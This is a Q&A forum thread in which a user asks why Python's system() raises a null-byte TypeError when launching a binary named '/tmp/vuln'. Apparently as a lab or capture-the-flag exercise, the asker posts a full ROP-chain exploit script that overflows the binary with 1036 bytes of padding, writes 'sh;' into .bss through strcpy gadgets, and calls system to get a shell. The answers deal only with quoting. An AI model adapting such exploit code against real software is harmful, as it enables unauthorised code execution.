<div class="post-text" itemprop="text">
<p>I am trying to execute a c program with an input string argument on a python script. But I am getting a type error. </p>
<p>p -&gt; is a string variable
vuln -&gt; is a c binary that I can execute fine using the terminal</p>
<p>This is the line that is giving the error:</p>
<pre><code>system("/tmp/vuln\""+p+"\"")
</code></pre>
<p>TypeError: system() argument 1 must be string without null bytes, not str</p>
<p>Thanks</p>
<p><strong>Update:This is the complete code</strong></p>
<pre><code>#!/usr/bin/python

from struct import pack
from os import system

junk = 'A'*1036 #junk to offset to stored ret
strcpy = pack("&lt;L", 0x0016bf60) #system - 0x10
ppr = pack("&lt;L", 0x080483c2) #pop pop ret

p = junk
p += strcpy
p += ppr
p += pack("&lt;L", 0x0804969c) #bss
p += pack("&lt;L", 0x08048142) # 's'
p += strcpy
p += ppr
p += pack("&lt;L", 0x0804969d) #bss+1
p += pack("&lt;L", 0x080482fa) # 'h'
p += strcpy
p += ppr
p += pack("&lt;L", 0x0804969f) #bss+2
p += pack("&lt;L", 0x080484ff) # ';'
p += pack("&lt;L", 0x0016bf70) #system
p += "AAAA"
p += pack("&lt;L", 0x0804969c) #bss (now contains "sh;&lt;junk&gt;")

system("/tmp/vuln " + p)
</code></pre>
</div>
<div class="post-text" itemprop="text">
<p>You don't need the escaped double-quotes.</p>
<pre><code>system("/tmp/vuln " + p) # note the space before the ending quote
</code></pre>
<p>should work fine.</p>
<p>Please note that if you'd like to read output from <code>vuln</code>, or interact with it in any way, you'd be much better off using the <a href="https://docs.python.org/3/library/subprocess.html" rel="nofollow"><code>subprocess</code></a> module.</p>
</div>
<div class="post-text" itemprop="text">
<p>Your input string is all messed up</p>
<pre><code>system("/tmp/vuln " + p)
</code></pre>
<p>The extra backspaces are escape characters, and you do not want those here</p>
</div>
<span class="comment-copy">Use python's other quoting character <code>'</code> and you need a space after <code>vuln</code>. Using <code>format</code> is cleaner <code>system('/tmp/vuln "{}"'.format(p))</code></span>
<span class="comment-copy">he may need p quoted in order for it to be treated as a single argument to vuln, but you can always use <code>'</code> - <code>'/tmp/vuln "{}"'.format(p)</code></span>
<span class="comment-copy">If P is a string, there is no reason for him to do any for formatting.</span>
<span class="comment-copy">The underlying shell may need the quotes, e.g. to create a file called "hello world" would need <code>touch "hello world"</code>, so this would mean you need the quotes to system, e.g. <code>p = "hellow world"; system('touch "{}".format(p))</code></span>
<span class="comment-copy">The argument inside system() will be created by concatenating the two strings before the function system it called.</span>
<span class="comment-copy">Try it... <code>system('touch hello world')</code> touches two files one called <code>hello</code> the other called <code>world</code> however, <code>system('touch "hello world"')</code> touches a single file called <code>hello world</code>.</span>
